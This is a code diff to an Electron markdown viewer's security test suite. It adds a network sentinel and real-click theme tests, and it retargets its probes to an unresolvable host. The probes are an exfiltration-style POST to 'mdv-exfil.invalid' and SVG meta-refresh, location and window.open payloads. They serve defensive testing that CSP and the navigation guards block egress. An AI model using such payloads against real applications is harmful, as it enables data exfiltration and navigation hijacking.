@@ -10,9 +10,51 @@
 // Payloads set window.__pwned rather than spawning a process. Each attack test
 // is paired with a feature test, because escaping these values is exactly the
 // kind of change that silently breaks a title, an image or a wireframe.
-const { app, BrowserWindow, ipcMain } = require("electron");
+const { app, BrowserWindow, ipcMain, session } = require("electron");
 const fs = require("fs");
 const path = require("path");
+
+// ---------------------------------------------------------------------------
+// Where the exfil / navigation probes point.
+//
+// These tests deliberately *attempt* outbound POSTs and navigations so they can
+// prove CSP and the navigation guards stop them. They used to aim at
+// example.com - which is reserved for documentation by RFC 2606, but is a real,
+// live host operated by IANA whose own page asks you to "avoid use in
+// operations". A test suite firing POSTs at it on every run is operations.
+//
+// `.invalid` is reserved by RFC 6761 s6.4 and is guaranteed never to resolve,
+// so nothing can reach a third party even if every guard in the app failed.
+//
+// The trap: simply swapping the domain would *weaken* these tests. Assertions
+// of the form "the fetch threw" or "the URL is not example.com" would then pass
+// because DNS failed, not because CSP blocked anything - a false pass that
+// survives deleting the security control entirely. So the domain change is
+// paired with the sentinel below, which watches the network layer itself.
+// ---------------------------------------------------------------------------
+const PROBE_HOST = "mdv-exfil.invalid";
+
+// Every request that reaches Electron's network stack, recorded but NOT
+// cancelled. Cancelling here would make the sentinel the thing doing the
+// blocking and prove nothing about the app. Because the target cannot resolve,
+// recording is safe. An empty list means the request never got past CSP /
+// the navigation guard - a strictly stronger claim than "the fetch threw".
+const netSentinel = [];
+
+function installNetSentinel() {
+  const seen = new Set();
+  for (const s of [session.defaultSession]) {
+    if (!s || seen.has(s)) continue;
+    seen.add(s);
+    s.webRequest.onBeforeRequest((details, callback) => {
+      if (/^(file|devtools|chrome-extension|blob|data):/i.test(details.url)) {
+        return callback({ cancel: false });
+      }
+      netSentinel.push({ url: details.url, type: details.resourceType });
+      callback({ cancel: false });
+    });
+  }
+}
 
 require("./main.js");
 
@@ -106,6 +148,7 @@ async function closeAll() {
 async function run() {
   await sleep(2500);
   hostWindow = BrowserWindow.getAllWindows()[0];
+  installNetSentinel();
 
   // ==========================================================================
   // SEC-05 - image popup interpolates alt into <title> and into an attribute
@@ -364,7 +407,7 @@ async function run() {
            fileRead = 'READ:' + (await r.text()).length;
          } catch (e) {}
          let exfil = 'blocked';
-         try { await fetch('https://example.com/x', { method: 'POST', body: 'y' }); exfil = 'SENT'; } catch (e) {}
+         try { await fetch('https://${PROBE_HOST}/x', { method: 'POST', body: 'y' }); exfil = 'SENT'; } catch (e) {}
          return {
            scriptRan: !!window.__cspEscape,
            handlerRan: !!window.__cspHandler,
@@ -485,7 +528,7 @@ async function run() {
     ["drive path", "C:\\pics\\a.png"],
     ["file url", "file:///C:/pics/b.png"],
     ["relative path", "img/c.png"],
-    ["https url", "https://example.com/d.png"],
+    ["https url", "https://example.invalid/d.png"],
   ];
   for (const [label, src] of KEEP_CASES) {
     popup = await openPopup("open-image-popup", { src, alt: "x", isDarkMode: false }, 1200);
@@ -619,12 +662,12 @@ async function run() {
     [
       "meta refresh",
       "<svg xmlns='http://www.w3.org/2000/svg' width='40' height='40'></svg>" +
-        "<meta http-equiv='refresh' content=\"0;url=https://example.com/meta-probe\">",
+        "<meta http-equiv='refresh' content=\"0;url=https://" + PROBE_HOST + "/meta-probe\">",
     ],
     [
       "meta refresh inside foreignObject",
       "<svg xmlns='http://www.w3.org/2000/svg' width='40' height='40'><foreignObject width='40' height='40'>" +
-        "<meta http-equiv='refresh' content=\"0;url=https://example.com/foreign-probe\">" +
+        "<meta http-equiv='refresh' content=\"0;url=https://" + PROBE_HOST + "/foreign-probe\">" +
         "</foreignObject></svg>",
     ],
   ];
@@ -640,7 +683,7 @@ async function run() {
     const url = popup.isDestroyed() ? "<destroyed>" : popup.webContents.getURL();
     check(
       `SEC-11 mermaid popup cannot be navigated away by ${label}`,
-      url.startsWith("file:///") && !/example\.com/.test(url),
+      url.startsWith("file:///") && !url.includes(PROBE_HOST),
       url.slice(0, 140),
     );
     await closeAll();
@@ -654,17 +697,17 @@ async function run() {
     1500,
   );
   if (popup) {
-    await popupEval(popup, `(() => { try { location.href = 'https://example.com/js-probe'; } catch (e) {} return 1; })()`);
+    await popupEval(popup, `(() => { try { location.href = 'https://${PROBE_HOST}/js-probe'; } catch (e) {} return 1; })()`);
     await new Promise((r) => setTimeout(r, 2000));
     const url = popup.isDestroyed() ? "<destroyed>" : popup.webContents.getURL();
     check(
       "SEC-11 mermaid popup cannot be navigated away by location assignment",
-      url.startsWith("file:///") && !/example\.com/.test(url),
+      url.startsWith("file:///") && !url.includes(PROBE_HOST),
       url.slice(0, 140),
     );
     // window.open must not spawn a second, unguarded window either.
     const before = BrowserWindow.getAllWindows().length;
-    await popupEval(popup, `(() => { try { window.open('https://example.com/open-probe'); } catch (e) {} return 1; })()`);
+    await popupEval(popup, `(() => { try { window.open('https://${PROBE_HOST}/open-probe'); } catch (e) {} return 1; })()`);
     await new Promise((r) => setTimeout(r, 1200));
     check(
       "SEC-11 mermaid popup cannot open a new window",
@@ -726,6 +769,129 @@ async function run() {
     check("FEATURE table popup CSV export still starts a download under CSP", false, "no window");
   }
   await closeAll();
+
+  // ---------------------------------------------------------------------
+  // Theme carried by the REAL renderer -> popup path.
+  //
+  // Every other case in this file calls openPopup(), which sends the IPC
+  // message straight to main.js with isDarkMode hardcoded false. That is the
+  // right call for CSP and injection testing, but it means the flag the app
+  // actually computes is never exercised - the suite would stay green if the
+  // renderer stopped sending the theme entirely, and every popup would open
+  // white against a dark app.
+  //
+  // That is not hypothetical. The mermaid theme bug fixed earlier in this fork
+  // was exactly this shape: a theme value that was correct wherever the tests
+  // looked and wrong on the path a user takes. So this section clicks the real
+  // buttons in a real rendered document, in both themes, and asserts the popup
+  // came up in the matching one.
+  const themeDoc = "# T\n\n| A | B |\n|---|---|\n| 1 | 2 |\n\n```mermaid\ngraph LR\n  PopA --> PopB\n```\n";
+  for (const wantDark of [true, false]) {
+    const label = wantDark ? "dark" : "light";
+    const appState = await mainWindow().webContents.executeJavaScript(
+      `(async () => {
+        if (document.body.classList.contains('dark-mode') !== ${wantDark}) {
+          document.getElementById('darkModeToggle').click();
+        }
+        await renderMarkdown(${JSON.stringify(themeDoc)}, 'full');
+        return JSON.stringify({
+          dark: document.body.classList.contains('dark-mode'),
+          table: document.querySelectorAll('.table-maximize-btn').length,
+          mermaid: document.querySelectorAll('.mermaid-maximize-btn').length
+        });
+      })()`,
+      true,
+    );
+    await sleep(2500);
+    const parsed = JSON.parse(appState);
+    check(
+      `FEATURE the app really is in ${label} mode with both maximize buttons rendered`,
+      parsed.dark === wantDark && parsed.table === 1 && parsed.mermaid === 1,
+      appState,
+    );
+
+    for (const [what, selector] of [
+      ["table", ".table-maximize-btn"],
+      ["mermaid", ".mermaid-maximize-btn"],
+    ]) {
+      const before = new Set(BrowserWindow.getAllWindows().map((w) => w.id));
+      await mainWindow().webContents.executeJavaScript(
+        `document.querySelector(${JSON.stringify(selector)}).click(); true`,
+        true,
+      );
+      let popup = null;
+      for (let i = 0; i < 60 && !popup; i++) {
+        await sleep(100);
+        popup = BrowserWindow.getAllWindows().find((w) => !before.has(w.id)) || null;
+      }
+      if (!popup) {
+        check(`FEATURE ${what} popup opens from a real click in ${label} mode`, false, "no window");
+        continue;
+      }
+      if (popup.webContents.isLoading()) {
+        await new Promise((resolve) => {
+          popup.webContents.once("did-finish-load", resolve);
+          setTimeout(resolve, 8000);
+        });
+      }
+      await sleep(600);
+      // Asserted as a luminance band rather than an exact hex so that a palette
+      // tweak does not fail the suite; what must never happen is a light popup
+      // over a dark app.
+      const bg = await popupEval(
+        popup,
+        `(() => {
+          const c = getComputedStyle(document.body).backgroundColor;
+          const m = c.match(/\\d+/g) || [255, 255, 255];
+          const lum = (0.299 * +m[0] + 0.587 * +m[1] + 0.114 * +m[2]) / 255;
+          return JSON.stringify({ c, lum });
+        })()`,
+      );
+      const lum = bg && !bg.__evalError ? JSON.parse(bg).lum : null;
+      check(
+        `FEATURE ${what} popup opened from a real click follows the app's ${label} theme`,
+        lum !== null && (wantDark ? lum < 0.3 : lum > 0.7),
+        `${bg} (window bg ${popup.getBackgroundColor && popup.getBackgroundColor()})`,
+      );
+      await closeAll();
+    }
+  }
+
+  // ==========================================================================
+  // SEC-11/12 - the network sentinel.
+  //
+  // Everything above asserted on symptoms observable from inside the page: the
+  // fetch threw, the URL did not change. Those are all satisfiable by a request
+  // that leaves the process and merely fails. This asserts the opposite and
+  // much stronger property - that nothing ever reached Electron's network stack
+  // at all, so CSP and the navigation guard stopped it before egress.
+  //
+  // Non-vacuous by construction: the probes above genuinely attempt a POST, a
+  // meta refresh, a location assignment and a window.open. Remove the CSP or
+  // the will-navigate guard and entries appear here.
+  // ==========================================================================
+  const escaped = netSentinel.filter((r) => r.url.includes(PROBE_HOST));
+  check(
+    "SEC-11/12 no exfil or navigation probe ever reached the network stack",
+    escaped.length === 0,
+    JSON.stringify(escaped.slice(0, 5)),
+  );
+  // The popups legitimately render remote <img> referenced by the document, so
+  // "zero requests" is the wrong invariant - it would fail on a working
+  // feature. The right one is that image loading is the *only* egress the
+  // popup can perform: no XHR/fetch, no script, no stylesheet, no subframe,
+  // no navigation. Anything else appearing here is a new covert channel.
+  //
+  // Worth recording as a product observation rather than a test failure:
+  // maximizing an image from a hostile document does contact its host, which
+  // leaks the reader's IP. That is inherited from the main viewer's behaviour
+  // and is a policy decision, not a regression - see SECURITY-AUDIT.md.
+  const nonImage = netSentinel.filter((r) => r.type !== "image");
+  check(
+    "SEC-12 popups can only ever emit image loads, never any other request type",
+    nonImage.length === 0,
+    JSON.stringify(nonImage.slice(0, 5)),
+  );
 }
 
 app.whenReady().then(async () => {
